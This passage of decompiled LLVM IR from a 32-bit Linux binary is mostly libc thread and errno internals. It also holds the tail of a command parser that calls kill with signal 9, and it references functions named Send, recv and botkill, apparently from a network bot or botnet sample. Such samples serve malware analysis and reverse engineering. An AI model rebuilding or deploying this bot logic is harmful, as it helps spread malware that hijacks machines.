  %v0_80555e6.lcssa = phi i32 [ %v1_80555d0, %dec_label_pc_805559f ], [ %v1_805561d, %dec_label_pc_80555dc ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_805559f ], [ %v4_8055620, %dec_label_pc_80555dc ]
  %v1_8055634 = add i32 %v0_80555e6.lcssa, -12
  %v2_8055634 = inttoptr i32 %v1_8055634 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_806c83e.649 to i32), i32* %v2_8055634, align 4
  store i32 %v2_80555ae, i32* %eax.global-to-local, align 4
  %v2_805563f = add i32 %v0_80555e6.lcssa, -16
  %v3_805563f = inttoptr i32 %v2_805563f to i32*
  store i32 %v2_80555ae, i32* %v3_805563f, align 4
  %v2_8055640 = inttoptr i32 %storemerge.lcssa to i8*
  %v3_8055640 = call i32 @__GI_strcasecmp(i8* %v2_8055640, i32 %v2_80550a6)
  store i32 %v3_8055640, i32* @eax, align 4
  %v0_8055645 = load i32, i32* @esp, align 4
  %v1_8055648 = icmp eq i32 %v3_8055640, 0
  %v1_805564a = icmp eq i1 %v1_8055648, false
  br i1 %v1_805564a, label %dec_label_pc_8055683, label %dec_label_pc_805564c

dec_label_pc_805564c:                             ; preds = %dec_label_pc_8055631
  %v0_805564c = load i32, i32* @global_var_8074068.296, align 8
  store i32 %v0_805564c, i32* %eax.global-to-local, align 4
  %v1_8055651 = icmp eq i32 %v0_805564c, 0
  br i1 %v1_8055651, label %dec_label_pc_8055293, label %dec_label_pc_8055659

dec_label_pc_8055659:                             ; preds = %dec_label_pc_805564c
  store i32 %v0_805564c, i32* %eax.global-to-local, align 4
  %v1_8055661 = add i32 %v0_8055645, 4
  %v2_8055661 = inttoptr i32 %v1_8055661 to i32*
  store i32 9, i32* %v2_8055661, align 4
  %v0_8055663 = load i32, i32* %eax.global-to-local, align 4
  %v3_8055663 = inttoptr i32 %v0_8055645 to i32*
  store i32 %v0_8055663, i32* %v3_8055663, align 4
  %v2_8055664 = call i32 @kill(i32 %storemerge.lcssa, i32 %v2_80550a6)
  store i32 %v2_8055664, i32* %eax.global-to-local, align 4
  %v1_805566c = icmp eq i32 %v2_8055664, 0
  %v1_805566e = icmp eq i1 %v1_805566c, false
  br i1 %v1_805566e, label %dec_label_pc_8055293, label %dec_label_pc_8055674

dec_label_pc_8055674:                             ; preds = %dec_label_pc_8055659
  store i32 0, i32* @global_var_8074068.296, align 8
  br label %dec_label_pc_8055293

dec_label_pc_8055683:                             ; preds = %dec_label_pc_8055631
  %v1_8055686 = add i32 %v0_8055645, 4
  %v2_8055686 = inttoptr i32 %v1_8055686 to i32*
  store i32 ptrtoint (i32* @global_var_806c83c.645 to i32), i32* %v2_8055686, align 4
  %v2_805568b = inttoptr i32 %v0_8055645 to i32*
  store i32 0, i32* %v2_805568b, align 4
  %v2_805568d = call i32 @__GI_strtok(i32 %storemerge.lcssa, i32 %v2_80550a6)
  store i32 %v2_805568d, i32* %eax.global-to-local, align 4
  %v0_8055692 = load i32, i32* @esp, align 4
  store i32 %v2_805568d, i32* %tmp107, align 4
  %v5_8055698 = icmp eq i32 %v2_805568d, 0
  %tmp111 = inttoptr i32 %v2_805568d to i8*
  br i1 %v5_8055698, label %dec_label_pc_80552d1.outer.outer, label %dec_label_pc_80556a2

dec_label_pc_80556a2:                             ; preds = %dec_label_pc_80554a4, %dec_label_pc_8055683
  %v5_80554ce.in = phi i32 [ %v0_8055692, %dec_label_pc_8055683 ], [ %v0_80554c3, %dec_label_pc_80554a4 ]
  %v3_80554ce = phi i8* [ %tmp111, %dec_label_pc_8055683 ], [ %v5_80554c6, %dec_label_pc_80554a4 ]
  %stack_var_-6632.331 = phi i8* [ %stack_var_-6632.2.ph, %dec_label_pc_8055683 ], [ %stack_var_-6632.1.ph.ph113, %dec_label_pc_80554a4 ]
  %v4_80556a2 = ptrtoint i8* %v3_80554ce to i32
  store i32 %v4_80556a2, i32* %eax.global-to-local, align 4
  %v2_80556a5 = load i8, i8* %v3_80554ce, align 1
  %v3_80556a5 = zext i8 %v2_80556a5 to i32
  %v5_80556a5 = and i32 %v4_80556a2, -256
  %v6_80556a5 = or i32 %v3_80556a5, %v5_80556a5
  store i32 %v6_80556a5, i32* %eax.global-to-local, align 4
  %v4_80556a7 = icmp eq i8 %v2_80556a5, 0
  %v1_80556a9 = icmp eq i1 %v4_80556a7, false
  br i1 %v1_80556a9, label %dec_label_pc_80554ce, label %dec_label_pc_80552d1.outer.outer

; uselistorder directives
  uselistorder i32 %v4_80556a2, { 1, 2, 0 }
  uselistorder i32 %v2_805568d, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8055645, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge.lcssa, { 2, 0, 1 }
  uselistorder i32* %v3_8055626, { 1, 0 }
  uselistorder i32 %v1_8055626, { 1, 0 }
  uselistorder i32 %v4_8055620, { 0, 2, 3, 1 }
  uselistorder i32 %v0_80555f6, { 0, 3, 1, 2 }
  uselistorder i32 %storemerge159, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80555ba, { 1, 0 }
  uselistorder i32 %.pre59, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge7, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-6632.2.ph, { 4, 5, 2, 1, 0, 3 }
  uselistorder i8* %v3_8055571.pre, { 3, 2, 0, 1 }
  uselistorder i32 %v0_805553c, { 1, 0 }
  uselistorder i32 %.pre67, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge8, { 0, 1, 3, 2 }
  uselistorder i32 %v5_80554dc, { 1, 0 }
  uselistorder i8* %v3_80554d9, { 4, 0, 3, 2, 1, 5, 6 }
  uselistorder i32 %v4_805548f, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8055465, { 2, 1, 0 }
  uselistorder i32 %v1_805545d, { 1, 0 }
  uselistorder i32 %v0_8055456, { 2, 0, 1 }
  uselistorder i32 %stack_var_-40.3.lcssa, { 6, 3, 2, 1, 0, 5, 4, 7, 8 }
  uselistorder i32 %v0_805548046, { 1, 0 }
  uselistorder i32 %v4_805541f, { 1, 2, 0 }
  uselistorder i32 %v2_8055403, { 2, 0, 1 }
  uselistorder i32 %storemerge10139, { 1, 0 }
  uselistorder i32 %v1_80553ec, { 1, 3, 2, 0 }
  uselistorder i32 %v2_8055392, { 1, 2, 0 }
  uselistorder i32 %v2_8055388, { 1, 0, 2 }
  uselistorder i32 %v4_80553ac, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8055395135, { 1, 0 }
  uselistorder i32 %v2_8055388128, { 2, 1, 0 }
  uselistorder i32 %.pre, { 1, 5, 2, 3, 0, 6, 4 }
  uselistorder i32 %v2_8055355, { 1, 0 }
  uselistorder i32 %stack_var_-40.3150, { 1, 0 }
  uselistorder i32 %storemerge9151, { 2, 1, 0 }
  uselistorder i32 %v1_80552f9, { 1, 0 }
  uselistorder i32 %v2_80552f1, { 1, 0 }
  uselistorder i32 %v0_80552ea, { 1, 0 }
  uselistorder i32 %stack_var_-40.1, { 1, 2, 0 }
  uselistorder i8* %stack_var_-6632.1.ph.ph113, { 2, 1, 0 }
  uselistorder i32 %v2_8055557, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v2_8055204, { 1, 0, 2 }
  uselistorder i32 %stack_var_-6628.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80551d9, { 2, 1, 0 }
  uselistorder i32 %v3_80551b0, { 1, 0 }
  uselistorder i32 %v2_805518e, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge12173, { 1, 0 }
  uselistorder i32 %v2_80550a6, { 5, 1, 2, 3, 4, 6, 0, 8, 7, 9 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i8** %stack_var_-6656, { 14, 13, 12, 11, 10, 9, 8, 7, 16, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder i8** %stack_var_-32, { 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 27, 28, 3, 4, 5, 6, 7, 8, 13, 14, 9, 10, 11, 12, 82, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 33, 34, 31, 32, 46, 35, 36, 38, 37, 83, 39, 41, 40, 1, 42, 43, 44, 45, 2, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 70, 64, 65, 66, 67, 68, 69, 0, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder [4 x i8]** @global_var_806f860.647, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 15, 14, 1, 13, 0, 12, 11, 10, 9, 7, 8, 6, 3, 5, 2, 4 }
  uselistorder i32* @global_var_807e0fc.32, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* @global_var_807407c.31, { 6, 7, 1, 8, 9, 10, 2, 0, 11, 3, 12, 4, 13, 14, 15, 5, 16, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 6, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @Send, { 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 35, 34, 33, 32, 31, 30, 29, 28, 166, 165, 164, 163, 162, 161, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i8** @global_var_807e0f8.299, { 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 10, 2, 9, 8, 7, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 9, 10, 11, 53, 54, 0, 1, 2, 3, 4, 5, 6, 7, 8, 55, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 57, 56 }
  uselistorder i32* @global_var_807ca60.63, { 1, 0 }
  uselistorder i32 ()* @botkill, { 1, 0 }
  uselistorder [130 x i8]* @global_var_806c77c.636, { 1, 0 }
  uselistorder [68 x i8]* @global_var_806c738.635, { 1, 0 }
  uselistorder i32 (i32)* @puts, { 3, 2, 1, 0 }
  uselistorder [73 x i8]* @global_var_806c6ec.634, { 1, 0 }
  uselistorder label %dec_label_pc_80556a2, { 1, 0 }
  uselistorder label %dec_label_pc_80555dc, { 1, 0 }
  uselistorder label %dec_label_pc_805556e, { 1, 0 }
  uselistorder label %dec_label_pc_805556e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80554ee, { 1, 0 }
  uselistorder label %dec_label_pc_8055456, { 1, 0 }
  uselistorder label %dec_label_pc_8055445, { 1, 0 }
  uselistorder label %dec_label_pc_805542c, { 1, 0 }
  uselistorder label %dec_label_pc_8055400, { 1, 0 }
  uselistorder label %dec_label_pc_8055385, { 1, 0 }
  uselistorder label %dec_label_pc_8055352, { 1, 0 }
  uselistorder label %dec_label_pc_80552d1, { 1, 0 }
  uselistorder label %dec_label_pc_80552d1.outer, { 1, 0 }
  uselistorder label %dec_label_pc_80552d1.outer.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055293, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_805518b, { 1, 0 }
  uselistorder label %dec_label_pc_805513d, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_80556b4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_80556b4, i32* @edx, align 4
  %v0_80556bb = load i32, i32* @esp, align 4
  %v1_80556bb = load i32, i32* @global_var_807a620.650, align 32
  %v7_80556bb = icmp ult i32 %v0_80556bb, %v1_80556bb
  %v1_80556c1 = icmp eq i1 %v7_80556bb, false
  br i1 %v1_80556c1, label %dec_label_pc_80556f2, label %dec_label_pc_80556c3

dec_label_pc_80556c3:                             ; preds = %entry
  %v1_80556c3 = load i32, i32* @global_var_807a624.651, align 4
  %v7_80556c3 = icmp ult i32 %v0_80556bb, %v1_80556c3
  br i1 %v7_80556c3, label %dec_label_pc_80556d8, label %dec_label_pc_80556cb

dec_label_pc_80556cb:                             ; preds = %dec_label_pc_80556c3
  %v1_80556d0 = load i32, i32* @global_var_807a628.653, align 8
  %v7_80556d0 = icmp ult i32 %v0_80556bb, %v1_80556d0
  br i1 %v7_80556d0, label %dec_label_pc_80556f2, label %dec_label_pc_80556d8

dec_label_pc_80556d8:                             ; preds = %dec_label_pc_80556cb, %dec_label_pc_80556c3
  %v0_80556d8 = load i32, i32* @global_var_807e100.654, align 256
  %v1_80556d8 = icmp eq i32 %v0_80556d8, 0
  br i1 %v1_80556d8, label %dec_label_pc_80556e6, label %dec_label_pc_80556e1

dec_label_pc_80556e1:                             ; preds = %dec_label_pc_80556d8
  %v0_80556e1 = call i32 @__pthread_find_self()
  br label %dec_label_pc_80556e6

dec_label_pc_80556e6:                             ; preds = %dec_label_pc_80556d8, %dec_label_pc_80556e1
  %v3_80556e6 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_80556e6, i32* @edx, align 4
  %v2_80556ec = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80556f2

dec_label_pc_80556f2:                             ; preds = %dec_label_pc_80556cb, %entry, %dec_label_pc_80556e6
  %v0_80556f2 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_80556cb ], [ 134691008, %entry ], [ %v2_80556ec, %dec_label_pc_80556e6 ]
  ret i32 %v0_80556f2

; uselistorder directives
  uselistorder label %dec_label_pc_80556f2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80556e6, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_80556f6 = call i32 @thread_self()
  %v1_80556fb = add i32 %v0_80556f6, 76
  %v2_80556fb = inttoptr i32 %v1_80556fb to i32*
  %v3_80556fb = load i32, i32* %v2_80556fb, align 4
  ret i32 %v3_80556fb
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8055705 = call i32 @thread_self()
  %v1_805570a = add i32 %v0_8055705, 68
  %v2_805570a = inttoptr i32 %v1_805570a to i32*
  %v3_805570a = load i32, i32* %v2_805570a, align 4
  ret i32 %v3_805570a
}

define i32 @__pthread_set_own_extricate_if() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055714 = load i32, i32* @esi, align 4
  %v0_8055715 = load i32, i32* @ebx, align 4
  %v0_8055719 = load i32, i32* @eax, align 4
  store i32 %v0_8055719, i32* @ebx, align 4
  %v0_805571b = load i32, i32* @edx, align 4
  store i32 %v0_805571b, i32* @esi, align 4
  %v1_805571d = icmp eq i32 %v0_805571b, 0
  br i1 %v1_805571d, label %dec_label_pc_8055729, label %dec_label_pc_8055721

dec_label_pc_8055721:                             ; preds = %entry
  %v1_8055721 = add i32 %v0_8055719, 64
  %v2_8055721 = inttoptr i32 %v1_8055721 to i8*
  %v3_8055721 = load i8, i8* %v2_8055721, align 1
  %v4_8055721 = icmp eq i8 %v3_8055721, 0
  %v1_8055725 = icmp eq i1 %v4_8055721, false
  br i1 %v1_8055725, label %dec_label_pc_805574b, label %dec_label_pc_8055733

dec_label_pc_8055729:                             ; preds = %entry
  %v1_8055729 = add i32 %v0_8055719, 28
  %v2_8055729 = inttoptr i32 %v1_8055729 to i32*
  %v3_8055729 = load i32, i32* %v2_8055729, align 4
  store i32 %v3_8055729, i32* @eax, align 4
  store i32 %v0_8055719, i32* @edx, align 4
  %v1_805572e = call i32 @__pthread_lock(i32 %v0_8055715)
  %v1_8055733.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055733

dec_label_pc_8055733:                             ; preds = %dec_label_pc_8055721, %dec_label_pc_8055729
  %v1_8055733 = phi i32 [ %v0_8055719, %dec_label_pc_8055721 ], [ %v1_8055733.pre, %dec_label_pc_8055729 ]
  %v2_8055733 = add i32 %v1_8055733, 444
  %v3_8055733 = inttoptr i32 %v2_8055733 to i32*
  store i32 %v0_805571b, i32* %v3_8055733, align 4
  %v1_805573b = icmp eq i1 %v1_805571d, false
  br i1 %v1_805573b, label %dec_label_pc_805574b, label %dec_label_pc_805573d

dec_label_pc_805573d:                             ; preds = %dec_label_pc_8055733
  %v0_8055740 = load i32, i32* @ebx, align 4
  %v1_8055740 = add i32 %v0_8055740, 28
  %v2_8055740 = inttoptr i32 %v1_8055740 to i32*
  %v3_8055740 = load i32, i32* %v2_8055740, align 4
  %v1_8055743 = inttoptr i32 %v3_8055740 to i32*
  %v2_8055743 = call i32 @__pthread_unlock(i32* %v1_8055743)
  br label %dec_label_pc_805574b

dec_label_pc_805574b:                             ; preds = %dec_label_pc_8055733, %dec_label_pc_8055721, %dec_label_pc_805573d
  %v2_805574b = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8055715, i32* @ebx, align 4
  store i32 %v0_8055714, i32* @esi, align 4
  ret i32 %v2_805574b

; uselistorder directives
  uselistorder i1 %v1_805571d, { 1, 0 }
  uselistorder label %dec_label_pc_805574b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055733, { 1, 0 }
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8055756 = load i32, i32* @esp, align 4
  %v1_8055756 = load i32, i32* @global_var_807a620.650, align 32
  %v7_8055756 = icmp ult i32 %v0_8055756, %v1_8055756
  %v1_805575c = icmp eq i1 %v7_8055756, false
  br i1 %v1_805575c, label %dec_label_pc_805578d, label %dec_label_pc_805575e

dec_label_pc_805575e:                             ; preds = %entry
  %v1_805575e = load i32, i32* @global_var_807a624.651, align 4
  %v7_805575e = icmp ult i32 %v0_8055756, %v1_805575e
  br i1 %v7_805575e, label %dec_label_pc_8055773, label %dec_label_pc_8055766

dec_label_pc_8055766:                             ; preds = %dec_label_pc_805575e
  %v1_805576b = load i32, i32* @global_var_807a628.653, align 8
  %v7_805576b = icmp ult i32 %v0_8055756, %v1_805576b
  br i1 %v7_805576b, label %dec_label_pc_805578d, label %dec_label_pc_8055773

dec_label_pc_8055773:                             ; preds = %dec_label_pc_8055766, %dec_label_pc_805575e
  %v0_8055773 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8055773 = icmp eq i32 %v0_8055773, 0
  br i1 %v1_8055773, label %dec_label_pc_8055781, label %dec_label_pc_805577c

dec_label_pc_805577c:                             ; preds = %dec_label_pc_8055773
  %v0_805577c = call i32 @__pthread_find_self()
  br label %dec_label_pc_8055781

dec_label_pc_8055781:                             ; preds = %dec_label_pc_8055773, %dec_label_pc_805577c
  %v2_8055787 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805578d

dec_label_pc_805578d:                             ; preds = %dec_label_pc_8055766, %entry, %dec_label_pc_8055781
  %v0_805578d = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8055766 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_8055787, %dec_label_pc_8055781 ]
  ret i32 %v0_805578d

; uselistorder directives
  uselistorder label %dec_label_pc_805578d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055781, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_805578e = load i32, i32* @esi, align 4
  %v0_805578f = load i32, i32* @ebx, align 4
  %v2_8055793 = call i32 @thread_self.1(i32 %v0_805578f, i32 %v0_805578e)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8055793, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_80557a6 = call i32 @__pthread_lock(i32 %v2_8055793)
  %v0_80557ab = load i32, i32* @ebx, align 4
  %v1_80557ab = add i32 %v0_80557ab, 8
  %v2_80557ab = inttoptr i32 %v1_80557ab to i32*
  %v3_80557ab = load i32, i32* %v2_80557ab, align 4
  %v1_80557ae = add i32 %v3_80557ab, 56
  %v2_80557ae = inttoptr i32 %v1_80557ae to i32*
  %v3_80557ae = load i32, i32* %v2_80557ae, align 4
  %v4_80557ae = icmp eq i32 %v3_80557ae, 0
  %v1_80557b2 = icmp eq i1 %v4_80557ae, false
  %v2_80557b2 = zext i1 %v1_80557b2 to i32
  %v3_80557b2 = load i32, i32* @edx, align 4
  %v4_80557b2 = and i32 %v3_80557b2, -256
  %v5_80557b2 = or i32 %v2_80557b2, %v4_80557b2
  store i32 %v5_80557b2, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v2_80557ae, align 4
  %v0_80557bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80557bf = urem i32 %v0_80557bf, 256
  store i32 %v1_80557bf, i32* @esi, align 4
  %v0_80557c2 = load i32, i32* @ebx, align 4
  %v1_80557c3 = inttoptr i32 %v0_80557c2 to i32*
  %v2_80557c3 = call i32 @__pthread_unlock(i32* %v1_80557c3)
  %v0_80557c8 = load i32, i32* @esi, align 4
  ret i32 %v0_80557c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_80557d3 = load i32, i32* @eax, align 4
  %v1_80557d4 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_80557d3)
  ret i32 %v1_80557d4
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_80557dd = load i32, i32* @esi, align 4
  %v0_80557de = load i32, i32* @ebx, align 4
  %v2_80557e5 = call i32 @thread_self.1(i32 %v0_80557de, i32 %v0_80557dd)
  store i32 %v2_80557e5, i32* @ebx, align 4
  %v1_80557ef = add i32 %v2_80557e5, 64
  %v2_80557ef = inttoptr i32 %v1_80557ef to i8*
  store i8 1, i8* %v2_80557ef, align 1
  %v1_80557f3 = add i32 %v2_80557e5, 65
  %v2_80557f3 = inttoptr i32 %v1_80557f3 to i8*
  store i8 0, i8* %v2_80557f3, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_80557fe = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_8055803 = call i32 @__pthread_destroy_specifics()
  %v0_8055808 = load i32, i32* @ebx, align 4
  %v1_8055808 = add i32 %v0_8055808, 28
  %v2_8055808 = inttoptr i32 %v1_8055808 to i32*
  %v3_8055808 = load i32, i32* %v2_8055808, align 4
  store i32 %v3_8055808, i32* @eax, align 4
  store i32 %v0_8055808, i32* @edx, align 4
  %v0_805580d = load i32, i32* %stack_var_-188, align 4
  %v1_805580d = call i32 @__pthread_lock(i32 %v0_805580d)
  %v1_8055819 = load i32, i32* @ebx, align 4
  %v2_8055819 = add i32 %v1_8055819, 48
  %v3_8055819 = inttoptr i32 %v2_8055819 to i32*
  store i32 %arg1, i32* %v3_8055819, align 4
  %v0_805581f = load i32, i32* @ebx, align 4
  %v1_805581f = add i32 %v0_805581f, 412
  %v2_805581f = inttoptr i32 %v1_805581f to i32*
  %v3_805581f = load i32, i32* %v2_805581f, align 4
  %v4_805581f = icmp eq i32 %v3_805581f, 0
  br i1 %v4_805581f, label %dec_label_pc_8055853, label %dec_label_pc_8055828

dec_label_pc_8055828:                             ; preds = %entry
  %v0_8055828 = load i32, i32* @global_var_807e104.655, align 4
  %v2_805582d = add i32 %v0_805581f, 416
  %v3_805582d = inttoptr i32 %v2_805582d to i32*
  %v4_805582d = load i32, i32* %v3_805582d, align 4
  %v5_805582d = or i32 %v4_805582d, %v0_8055828
  store i32 %v5_805582d, i32* @eax, align 4
  %v3_8055833 = and i32 %v5_805582d, 256
  %v4_8055833 = icmp eq i32 %v3_8055833, 0
  br i1 %v4_8055833, label %dec_label_pc_8055853, label %dec_label_pc_8055838

dec_label_pc_8055838:                             ; preds = %dec_label_pc_8055828
  %v1_8055838 = add i32 %v0_805581f, 424
  %v2_8055838 = inttoptr i32 %v1_8055838 to i32*
  store i32 9, i32* %v2_8055838, align 4
  %v0_8055842 = load i32, i32* @ebx, align 4
  %v2_8055842 = add i32 %v0_8055842, 428
  %v3_8055842 = inttoptr i32 %v2_8055842 to i32*
  store i32 %v0_8055842, i32* %v3_8055842, align 4
  %v0_8055848 = load i32, i32* @ebx, align 4
  store i32 %v0_8055848, i32* @global_var_807e10c.656, align 4
  %v0_805584e = call i32 @__linuxthreads_death_event()
  %v0_8055856.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055853

dec_label_pc_8055853:                             ; preds = %dec_label_pc_8055828, %entry, %dec_label_pc_8055838
  %v0_8055856 = phi i32 [ %v0_805581f, %dec_label_pc_8055828 ], [ %v0_805581f, %entry ], [ %v0_8055856.pre, %dec_label_pc_8055838 ]
  %v1_8055856 = add i32 %v0_8055856, 56
  %v2_8055856 = inttoptr i32 %v1_8055856 to i32*
  %v3_8055856 = load i32, i32* %v2_8055856, align 4
  %v1_8055859 = add i32 %v0_8055856, 44
  %v2_8055859 = inttoptr i32 %v1_8055859 to i8*
  store i8 1, i8* %v2_8055859, align 1
  %v0_805585d = load i32, i32* @ebx, align 4
  %v1_805585d = add i32 %v0_805585d, 28
  %v2_805585d = inttoptr i32 %v1_805585d to i32*
  %v3_805585d = load i32, i32* %v2_805585d, align 4
  store i32 %v3_805585d, i32* %stack_var_-188, align 4
  %v1_8055860 = inttoptr i32 %v3_805585d to i32*
  %v2_8055860 = call i32 @__pthread_unlock(i32* %v1_8055860)
  %v1_8055868 = icmp eq i32 %v3_8055856, 0
  br i1 %v1_8055868, label %dec_label_pc_8055878, label %dec_label_pc_805586c

dec_label_pc_805586c:                             ; preds = %dec_label_pc_8055853
  store i32 %v3_8055856, i32* %stack_var_-188, align 4
  %v1_8055870 = call i32 @__pthread_restart_new(i32 %v3_8055856)
  br label %dec_label_pc_8055878

dec_label_pc_8055878:                             ; preds = %dec_label_pc_8055853, %dec_label_pc_805586c
  %v0_8055878 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  store i32 %v0_8055878, i32* @esi, align 4
  %v0_805587e = load i32, i32* @ebx, align 4
  %v12_805587e = icmp eq i32 %v0_805587e, %v0_8055878
  %v1_8055880 = icmp eq i1 %v12_805587e, false
  br i1 %v1_8055880, label %dec_label_pc_80558ce, label %dec_label_pc_8055882

dec_label_pc_8055882:                             ; preds = %dec_label_pc_8055878
  %v0_8055882 = load i32, i32* @global_var_8073c84.658, align 4
  %v2_8055882 = icmp slt i32 %v0_8055882, 0
  br i1 %v2_8055882, label %dec_label_pc_80558ce, label %dec_label_pc_805588b

dec_label_pc_805588b:                             ; preds = %dec_label_pc_8055882
  store i32 %v0_8055878, i32* %stack_var_-156, align 4
  %v2_8055897 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_8055897

dec_label_pc_8055897:                             ; preds = %dec_label_pc_80558b3.dec_label_pc_8055897_crit_edge, %dec_label_pc_805588b
  %v0_80558a2 = phi i32 [ %v0_80558a2.pre, %dec_label_pc_80558b3.dec_label_pc_8055897_crit_edge ], [ %v0_8055882, %dec_label_pc_805588b ]
  store i32 %v0_80558a2, i32* %stack_var_-188, align 4
  %v3_80558a8 = call i32 @__libc_write(i32 %v0_80558a2, i32 %v2_8055897, i32 148)
  %v8_80558b0 = icmp eq i32 %v3_80558a8, -1
  %v1_80558b1 = icmp eq i1 %v8_80558b0, false
  br i1 %v1_80558b1, label %dec_label_pc_80558bd, label %dec_label_pc_80558b3

dec_label_pc_80558b3:                             ; preds = %dec_label_pc_8055897
  %v0_80558b3 = load i32, i32* %stack_var_-188, align 4
  %v1_80558b3 = call i32 @__errno_location(i32 %v0_80558b3)
  %v1_80558b8 = inttoptr i32 %v1_80558b3 to i32*
  %v2_80558b8 = load i32, i32* %v1_80558b8, align 4
  %v11_80558b8 = icmp eq i32 %v2_80558b8, 4
  br i1 %v11_80558b8, label %dec_label_pc_80558b3.dec_label_pc_8055897_crit_edge, label %dec_label_pc_80558bd

dec_label_pc_80558b3.dec_label_pc_8055897_crit_edge: ; preds = %dec_label_pc_80558b3
  %v0_80558a2.pre = load i32, i32* @global_var_8073c84.658, align 4
  br label %dec_label_pc_8055897

